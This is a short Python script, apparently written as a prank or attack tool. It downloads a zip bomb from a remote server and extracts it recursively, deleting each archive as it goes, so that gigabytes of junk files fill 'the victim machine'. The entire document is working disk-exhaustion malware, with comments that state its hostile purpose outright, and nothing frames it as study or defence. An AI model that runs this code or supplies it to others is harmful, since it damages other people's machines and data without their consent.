#!/bin/python
import os
import io
import zipfile
import urllib.request

##This Script downloads a ZipBomb and recursively unzips such that the root files remain. 
##This will result in several GB's of garbage files being dumped onto the victim machine.

##Grab the Zipbomb.
url = 'http://[redacted]/zipb/zipb.zip'
file= 'zipb.zip'
urllib.request.urlretrieve(url, file)

def findzip():
	global file_list
	file_list = []
	##Get a list of all files ending in zip in the working directory, and adds to a list.
	for f in os.listdir("."):
		if f.endswith(".zip"):
			file_list.append(f)
	##For each file ending in a zip, extract all its files into the working directory.
	for f in file_list:
		try:
			zf = zipfile.ZipFile(f)
			zf.extractall()
			zf.close()
			os.remove(f)
		except OSError:
			pass
	###Loop back to the top, and continue until the base file remains.
		findzip()
findzip()
